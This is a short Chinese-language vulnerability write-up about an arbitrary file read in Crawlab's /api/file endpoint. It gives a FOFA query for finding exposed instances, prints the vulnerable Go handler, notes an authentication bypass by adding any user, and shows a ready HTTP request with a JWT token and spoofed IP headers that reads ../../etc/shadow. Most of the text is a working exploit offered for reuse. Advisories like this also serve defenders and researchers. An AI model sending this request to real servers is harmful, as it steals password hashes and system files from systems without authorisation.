# Crawlab file 任意文件读取漏洞

## 漏洞描述

Crawlab 后台 /api/file接口 存在任意文件读取漏洞，攻击者通过漏洞就可以读取服务器中的任意文件

## 漏洞影响

```
Crawlab v0.0.1
```

## FOFA

```
title="Crawlab"
```

## 漏洞复现

登录页面

![](./images/202205241440512.png)

首先查看路由位置 main.go 文件 中的 file 接口对应的函数

![](./images/202205241440175.png)

```
package routes

import (
	"crawlab/utils"
	"github.com/gin-gonic/gin"
	"io/ioutil"
	"net/http"
)

// @Summary Get file
// @Description Get file
// @Tags file
// @Produce json
// @Param Authorization header string true "Authorization token"
// @Success 200 json string Response
// @Failure 400 json string Response
// @Router /file [get]
func GetFile(c *gin.Context) {
	path := c.Query("path")
	fileBytes, err := ioutil.ReadFile(path)
	if err != nil {
		HandleError(http.StatusInternalServerError, c, err)
	}
	c.JSON(http.StatusOK, Response{
		Status:  "ok",
		Message: "success",
		Data:    utils.BytesToString(fileBytes),
	})
}
```

![](./images/202205241440403.png)

接口调用为后台才可调用，通过任意用户添加可以完成绕过

path参数可控，发送Get请求读取任意文件

```
GET /api/file?path=../../etc/shadow HTTP/1.1
Host: 
Content-Length: 0
Accept: application/json, text/plain, */*
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjYwZGQxOWU0YmZjNzg3MDAxZDk1NjBjOSIsIm5iZiI6MTYzOTMwNTI2MiwidXNlcm5hbWUiOiJhZG1pbiJ9.mFRAwXN-QqTmFmPAxgFEJhVXwxVuxJMepHe4khADfgk
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: Hm_lvt_c35e3a563a06caee2524902c81975add=1639222117,1639278935; Hm_lpvt_c35e3a563a06caee2524902c81975add=1639278935
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close
```

![](./images/202205241441701.png)